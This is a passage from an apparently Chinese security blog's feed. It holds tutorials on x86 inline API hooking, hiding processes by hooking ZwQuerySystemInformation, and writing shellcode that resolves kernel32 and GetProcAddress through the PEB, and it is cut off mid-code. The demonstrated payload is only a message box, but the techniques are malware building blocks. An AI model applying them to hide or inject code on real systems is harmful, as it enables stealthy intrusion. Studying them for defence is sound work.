class="hljs-number">00000001</span><br><span class="hljs-attribute">00401192</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">08</span>D<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;KERNEL<span class="hljs-number">32</span>.GetProcAddres&gt;; \GetProcAddress<br><span class="hljs-attribute">00401198</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">35</span> <span class="hljs-number">00</span>D<span class="hljs-number">04000</span> mov esi,dword ptr ds:[&lt;&amp;KERNEL<span class="hljs-number">32</span>.VirtualPro&gt;;  kernel<span class="hljs-number">32</span>.VirtualProtect<br><span class="hljs-attribute">0040119E</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">4</span>D F<span class="hljs-number">8</span>       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">004011A1</span>  |.  <span class="hljs-number">51</span>            push ecx                                    ; /pOldProtect = <span class="hljs-number">049</span>BE<span class="hljs-number">914</span><br><span class="hljs-attribute">004011A2</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">40</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">40</span>                                   ; |NewProtect = PAGE_EXECUTE_READWRITE<br><span class="hljs-attribute">004011A4</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">05</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">5</span>                                    ; |Size = <span class="hljs-number">0</span>x<span class="hljs-number">5</span><br><span class="hljs-attribute">004011A6</span>  |.  <span class="hljs-number">50</span>            push eax                                    ; |Address = <span class="hljs-number">00000001</span><br><span class="hljs-attribute">004011A7</span>  |.  A<span class="hljs-number">3</span> A<span class="hljs-number">0424100</span>   mov dword ptr ds:[MessageBoxAAddressfailure&gt;; |<br><span class="hljs-attribute">004011AC</span>  |.  C<span class="hljs-number">745</span> F<span class="hljs-number">8</span> <span class="hljs-number">00000</span>&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span>              ; |<br><span class="hljs-attribute">004011B3</span>  |.  FFD<span class="hljs-number">6</span>          call esi                                    ; \VirtualProtect<br><span class="hljs-attribute">004011B5</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">0</span>D A<span class="hljs-number">0424100</span> mov ecx,dword ptr ds:[MessageBoxAAddressfai&gt;;  user<span class="hljs-number">32</span>.MessageBoxA<br><span class="hljs-attribute">004011BB</span>  |.  A<span class="hljs-number">1</span> <span class="hljs-number">98424100</span>   mov eax,dword ptr ds:[OldDatan_table]<br><span class="hljs-attribute">004011C0</span>  |.  <span class="hljs-number">8901</span>          mov dword ptr ds:[ecx],eax<br><span class="hljs-attribute">004011C2</span>  |.  A<span class="hljs-number">0</span> <span class="hljs-number">9</span>C<span class="hljs-number">424100</span>   mov al,byte ptr ds:[<span class="hljs-number">0</span>x<span class="hljs-number">41429</span>C]<br><span class="hljs-attribute">004011C7</span>  |.  <span class="hljs-number">8841</span> <span class="hljs-number">04</span>       mov byte ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>],al<br><span class="hljs-attribute">004011CA</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">004011CD</span>  |.  <span class="hljs-number">50</span>            push eax                                    ; /pOldProtect = <span class="hljs-number">00000001</span><br><span class="hljs-attribute">004011CE</span>  |.  FF<span class="hljs-number">75</span> F<span class="hljs-number">8</span>       push dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]                 ; |NewProtect = PAGE_NOACCESS|PAGE_WRITECOPY|PAGE_EXECUTE|PAGE_EXECUTE_READWRITE|MEM_COMMIT|<span class="hljs-number">400400</span><br><span class="hljs-attribute">004011D1</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">05</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">5</span>                                    ; |Size = <span class="hljs-number">0</span>x<span class="hljs-number">5</span><br><span class="hljs-attribute">004011D3</span>  |.  <span class="hljs-number">51</span>            push ecx                                    ; |Address = <span class="hljs-number">049</span>BE<span class="hljs-number">914</span><br><span class="hljs-attribute">004011D4</span>  |.  FFD<span class="hljs-number">6</span>          call esi                                    ; \VirtualProtect<br><span class="hljs-attribute">004011D6</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                    ; /Style = MB_OK|MB_APPLMODAL<br><span class="hljs-attribute">004011D8</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">641</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">64</span>                      ; |hook<br><span class="hljs-attribute">004011DD</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">6</span>C<span class="hljs-number">1</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">6</span>C                      ; |Inline Hook\ni am b<span class="hljs-number">1</span>ackie!!!<br><span class="hljs-attribute">004011E2</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                    ; |hOwner = NULL<br><span class="hljs-attribute">004011E4</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">10</span>D<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;USER<span class="hljs-number">32</span>.MessageBoxA&gt;]   ; \MessageBoxA<br><span class="hljs-attribute">004011EA</span>  |.  <span class="hljs-number">8</span>BF<span class="hljs-number">0</span>          mov esi,eax<br><span class="hljs-attribute">004011EC</span>  |.  E<span class="hljs-number">8</span> CFFEFFFF   call InlineHo.InlineHook_ansi_nolocketaryso&gt;<br><span class="hljs-attribute">004011F1</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">4</span>D FC       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">004011F4</span>  |.  <span class="hljs-number">8</span>BC<span class="hljs-number">6</span>          mov eax,esi<br><span class="hljs-attribute">004011F6</span>  |.  <span class="hljs-number">33</span>CD          xor ecx,ebp<br><span class="hljs-attribute">004011F8</span>  |.  <span class="hljs-number">5</span>E            pop esi                                     ;  InlineHo.<span class="hljs-number">0040103</span>C<br><span class="hljs-attribute">004011F9</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">06000000</span>   call InlineHo.__security_check_cookiepresen&gt;<br><span class="hljs-attribute">004011FE</span>  |.  <span class="hljs-number">8</span>BE<span class="hljs-number">5</span>          mov esp,ebp<br><span class="hljs-attribute">00401200</span>  |.  <span class="hljs-number">5</span>D            pop ebp                                     ;  InlineHo.<span class="hljs-number">0040103</span>C<br><span class="hljs-attribute">00401201</span>  \.  C<span class="hljs-number">2</span> <span class="hljs-number">1000</span>       retn <span class="hljs-number">0</span>x<span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><h4 id="注入方式实现inline-hook"><a href="#注入方式实现inline-hook" class="headerlink" title="注入方式实现inline hook"></a>注入方式实现inline hook</h4><p>我们可以将inline hook写成一个dll文件，然后通过远线程注入的方式，将其注入到进程中。</p><p>远程线程的具体实现：<a href="https://b1ack1e.github.io/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/">注入技术-远程线程注入</a></p><p>编写一个弹窗，实现效果如下</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/8.png"></p><p>当注入成功后，内容更改</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/9.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>本篇只介绍了32位的Inline Hook，但是64位原理相同，只是修改的字节数不同，还有跳转方式也只介绍了基于JMP的，还有其他几种跳转方式，感兴趣可以看《加密与解密第四版》其中有较为详细的介绍。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Inline-Hook&quot;&gt;&lt;a href=&quot;#Inline-Hook&quot; class=&quot;headerlink&quot; title=&quot;Inline Hook&quot;&gt;&lt;/a&gt;Inline Hook&lt;/h4&gt;&lt;p&gt;Inline Hook是Hook技术的一种，它是通过修改机器码来实现</summary>
      
    
    
    
    <category term="HOOK技术" scheme="https://b1ackie.cn/categories/HOOK%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="Inline Hook" scheme="https://b1ackie.cn/tags/Inline-Hook/"/>
    
  </entry>
  
  <entry>
    <title>隐藏技术-进程隐藏</title>
    <link href="https://b1ackie.cn/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/"/>
    <id>https://b1ackie.cn/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/</id>
    <published>2021-07-27T03:25:51.000Z</published>
    <updated>2021-08-09T10:52:38.617Z</updated>
    
    <content type="html"><![CDATA[<h4 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h4><p>在windows中，用户程序的所有操作都是基于WIN32API来实现的，例如使用任务管理器查看进程等操作，这就给了病毒木马操作的空间。它可以通过HOOK技术拦截API的调用，并对数据进行监控和修改，从而达到不可告人的目的。</p><p>实现进程隐藏可以HOOK ZwQuerySystemInformain来实现进程的隐藏。遍历进程通常是调用EnumProcesses或者CreateToolhelp32Snapshot等来实现。跟踪这些函数可以发现，他们内部都调用了ZwQuerySystemInformain函数。</p><p>可以用调试器跟踪一下CreateToolhelp32Snapshot函数，可以看到在内部调用了ZwQuerySystemInformain函数</p><p><img src="/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/1.png"></p><p>在ZwQuerySystemInformain函数的内部判断检索的信息是否是进程信息，若是，则对返回的进程信息进行修改，将隐藏的进程信息从中去掉再返回。</p><p>这需要用到Inline Hook，关于Inline Hook看这里</p><p><a href="https://b1ack1e.github.io/2021/07/28/HOOK-Inline%20Hook/">HOOK-Inline Hook</a></p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><p>ZwQuerySystemInformation</p><p>获取指定的系统信息</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf">NTSTATUS WINAPI ZwQuerySystemInformation(<br>  <span class="hljs-variable">_In_</span>      SYSTEM_INFORMATION_CLASS SystemInformationClass,<br>  <span class="hljs-variable">_Inout_</span>   PVOID                    SystemInformation,<br>  <span class="hljs-variable">_In_</span>      ULONG                    SystemInformationLength,<br>  <span class="hljs-variable">_Out_opt_</span> PULONG                   ReturnLength<br>);<br></code></pre></div></td></tr></table></figure><p>SystemInformationClass：要检索系统的信息类型。SystemProcessInformation(5)表示检索系统的进程信息。</p><p>SystemInformation：指向缓冲区的指针，用于接受请求的信息。该信息的大小和结构取决于SystemInformationClass的值。如检索信息是SystemProcessInformation那么缓冲区为SYSTEM_PROCESS_INFORMATION结构数组。</p><p>SystemInformationLength：SystemInformation指向缓冲区的大小。</p><p>ReturnLength：指向函数写入请求信息的实际大小的位置。</p><p>返回值：返回NTSTATUS成功或错误代码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;进程隐藏&quot;&gt;&lt;a href=&quot;#进程隐藏&quot; class=&quot;headerlink&quot; title=&quot;进程隐藏&quot;&gt;&lt;/a&gt;进程隐藏&lt;/h4&gt;&lt;p&gt;在windows中，用户程序的所有操作都是基于WIN32API来实现的，例如使用任务管理器查看进程等操作，这就给了病毒木马操</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="隐藏技术" scheme="https://b1ackie.cn/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>shellcode学习</title>
    <link href="https://b1ackie.cn/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/"/>
    <id>https://b1ackie.cn/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-07-22T01:58:08.000Z</published>
    <updated>2021-08-09T10:53:47.394Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellcode学习"><a href="#shellcode学习" class="headerlink" title="shellcode学习"></a>shellcode学习</h3><h4 id="编译器的一些设置"><a href="#编译器的一些设置" class="headerlink" title="编译器的一些设置"></a>编译器的一些设置</h4><h5 id="第一步修改入口点"><a href="#第一步修改入口点" class="headerlink" title="第一步修改入口点"></a>第一步修改入口点</h5><p>在编译器中修改程序的入口点，写代码时就可以使用新的入口点名</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/1.png"></p><p>修改过后，体积变得很小，使用IDA查看也可以看到左边函数只有两个。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/2.png"></p><h5 id="第二步关闭缓冲区安全检查"><a href="#第二步关闭缓冲区安全检查" class="headerlink" title="第二步关闭缓冲区安全检查"></a>第二步关闭缓冲区安全检查</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/3.png"></p><p>然后查看IDA，左边函数只剩一个了</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/4.png"></p><h5 id="第三步设置工程兼容XP"><a href="#第三步设置工程兼容XP" class="headerlink" title="第三步设置工程兼容XP"></a>第三步设置工程兼容XP</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/5.png"></p><p>修改运行库为MT</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/6.png"></p><h5 id="第四步关闭生成清单"><a href="#第四步关闭生成清单" class="headerlink" title="第四步关闭生成清单"></a>第四步关闭生成清单</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/7.png"></p><p>使用loadpe查看看到只有两个区段</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/8.png"></p><h5 id="第五步关闭调试信息"><a href="#第五步关闭调试信息" class="headerlink" title="第五步关闭调试信息"></a>第五步关闭调试信息</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/9.png"></p><h4 id="shellcode编写原则1"><a href="#shellcode编写原则1" class="headerlink" title="shellcode编写原则1"></a>shellcode编写原则1</h4><ul><li>杜绝双引号字符串的直接使用</li><li>关闭VS自动优化没有使用到的变量</li><li>自定义函数入口</li></ul><p>#pragma comment(linker,”/entry:EntryMain”)</p><h4 id="shellcode编写原则2"><a href="#shellcode编写原则2" class="headerlink" title="shellcode编写原则2"></a>shellcode编写原则2</h4><p>动态获取函数地址</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/entry:EntryMain&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EntryMain</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* FN_MessageBoxA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            __in_opt HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">            __in_opt LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">            __in_opt LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">            __in UINT uType)</span></span>;<br>    FN_MessageBoxA fn_MessageBoxA;<br>    fn_MessageBoxA = (FN_MessageBoxA)GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;user32.dll&quot;</span>), <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>    fn_MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;b1ackie&quot;</span>, <span class="hljs-string">&quot;hhh&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="shellcode编写原则3"><a href="#shellcode编写原则3" class="headerlink" title="shellcode编写原则3"></a>shellcode编写原则3</h4><p>获取kernel32.dll基址和GetProcAddress地址获取。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/entry:EntryMain&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ucrtd.lib&quot;</span>) </span><br><span class="hljs-comment">//#pragma comment(lib, &quot;msvcrtd.lib&quot;) </span><br><span class="hljs-comment">//#pragma comment(lib, &quot;vcruntimed.lib&quot;) </span><br>_declspec(naked) <span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span> </span>&#123;<br>__asm &#123;<br>mov eax, fs: [<span class="hljs-number">30</span>h]<span class="hljs-comment">//获取PEB</span><br>mov eax, [eax + <span class="hljs-number">0</span>Ch]<span class="hljs-comment">//获取_PEB_LDR_DATA</span><br>mov eax, [eax + <span class="hljs-number">14</span>h]<span class="hljs-comment">//InMemoryOrderModuleList，</span><br>mov eax, [eax]<span class="hljs-comment">//程序自身</span><br>mov eax, [eax]<span class="hljs-comment">//ntdll.dll</span><br>mov eax,[eax+<span class="hljs-number">10</span>h]<span class="hljs-comment">//kernel.dll,偏移10H是地址</span><br>ret <br>&#125;<br>&#125;<br>FARPROC _GetProcAddress(HMODULE hModule) &#123;<br><br><br><br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;<br>PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);<br><br>PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + <br>(DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames);<br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals);<br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions);<br>DWORD dwNumber = lpExport-&gt;NumberOfNames;<br>DWORD wHint = <span class="hljs-number">0</span>;<br>FARPROC lpFunc;<br><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwNumber; i++) &#123;<br><span class="hljs-keyword">char</span> *lpFuncName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (lpFuncName[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;e&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;t&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;P&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;r&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;o&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;c&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">7</span>] == <span class="hljs-string">&#x27;A&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">8</span>] == <span class="hljs-string">&#x27;d&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">9</span>] == <span class="hljs-string">&#x27;d&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;r&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;e&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">12</span>] == <span class="hljs-string">&#x27;s&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">13</span>] == <span class="hljs-string">&#x27;s&#x27;</span>) &#123;<br>wHint = lpAddressOfNameOrdinalArray[i];<br>lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> lpFunc;<br><span class="hljs-comment">//PWORD </span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EntryMain</span><span class="hljs-params">()</span> </span>&#123;<br>HMODULE hAddr = (HMODULE)getKernel32();<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* FN_GetProcAddress)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br>FN_GetProcAddress fn_GetProcAddress;<br>fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="shellcode编写原则4"><a href="#shellcode编写原则4" class="headerlink" title="shellcode编写原则4"></a>shellcode编写原则4</h4><ul><li><p>避免全局变量的使用</p></li><li><p>确保已加载所使用的API的动态链接库</p></li></ul><h4 id="第一种shellcode生成框架"><a href="#第一种shellcode生成框架" class="headerlink" title="第一种shellcode生成框架"></a>第一种shellcode生成框架</h4><p>通过上述操作直接编写，编写一个拥有弹窗功能的shellcode</p><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span></span>;<br>FARPROC _GetProcAddress(HMODULE hModule);<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EntryMain</span><span class="hljs-params">()</span> </span>&#123;<br>HMODULE hAddr = (HMODULE)getKernel32();<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* FN_GetProcAddress)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br>FN_GetProcAddress fn_GetProcAddress;<br>fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr);<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* FN_LoadLibraryA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpLibFileName)</span></span>;<br><span class="hljs-keyword">char</span> szLoadLibraryA[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>FN_LoadLibraryA fn_LoadLibraryA = 